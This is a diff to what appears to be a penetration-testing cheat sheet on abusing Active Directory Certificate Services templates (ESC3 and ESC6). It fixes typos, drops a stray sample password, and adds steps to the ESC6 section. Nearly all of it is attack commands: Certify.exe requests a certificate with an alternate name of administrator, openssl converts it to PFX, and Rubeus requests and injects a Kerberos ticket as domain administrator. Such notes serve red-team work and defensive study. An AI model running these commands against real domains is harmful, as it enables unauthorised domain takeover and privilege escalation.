@@ -381,7 +381,7 @@ C:> Certify.exe find /vulnerable
 C:> Certify.exe find
 # Search for the one with 'Application Policies : Certificate Request Agent'
 
-# Request an enrollment agent certificat e from first template and save to file
+# Request an enrollment agent certificate from first template and save to file
 C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Agent
 
 # Convert to PFX
@@ -397,8 +397,8 @@ C:> openssl.exe pkcs12 -in <in_file>.pem -keyex -CSP "Microsoft Enhanced Cryptog
                 -export -out <out_file>.pfx
 
 # Request TGT aS DOMAIN ADMIN
-c:> Rubeus.exe asktgt /user:administrator /certificate:<OOUT_fILE_PREVIOUS_STEP>.pfx 
-                      /password:<pass_previous_step>SecretPass@123 /ptt
+c:> Rubeus.exe asktgt /user:administrator /certificate:<OUT_fILE_PREVIOUS_STEP>.pfx 
+                      /password:<pass_previous_step> /ptt
 ```
 
 #### ESC6
@@ -415,5 +415,11 @@ C:> Certify.exe find
 # Request certificate for alternate DA
 C:> Certify.exe request /ca:<CA_name> /template:"CA-Integration" /altname:administrator
 
-# Convert to PFX and request a TGT as before techniques
+# Convert to PFX
+C:> openssl.exe pkcs12 -in <in_file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
+                -export -out <out_file>.pfx
+
+# Request TGT aS DOMAIN ADMIN
+c:> Rubeus.exe asktgt /user:administrator /certificate:<OUT_fILE_PREVIOUS_STEP>.pfx 
+                      /password:<pass_previous_step> /ptt
 ```
